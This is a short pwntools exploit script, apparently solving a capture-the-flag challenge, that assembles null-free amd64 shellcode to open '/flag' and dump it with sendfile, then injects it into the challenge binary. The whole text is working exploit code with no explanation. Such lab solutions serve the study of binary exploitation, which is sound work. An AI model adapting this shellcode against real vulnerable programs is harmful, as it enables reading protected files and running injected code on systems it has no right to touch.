from pwn import *

shellcode = asm("""
    mov     rdi, 0x67616c66
    shl     rdi, 8
    or      rdi, 0x2f

    push    rdi
    push    rsp
    pop     rdi

    xor     rsi, rsi
    xor     rdx, rdx

    push    SYS_open
    pop     rax
    syscall

    xor     rdi, rdi
    inc     rdi

    xchg    rax, rsi
    xor     rdx, rdx
    push    0x60
    pop     r10

    push    SYS_sendfile
    pop     rax
    syscall

    push    SYS_exit
    pop     rax
    syscall

""", arch='amd64', os='linux')


io = process(['/challenge/binary-exploitation-null-free-shellcode'])

io.send(shellcode)
io.recvline_contains(b'Executing shellcode')

print(io.readall().decode())


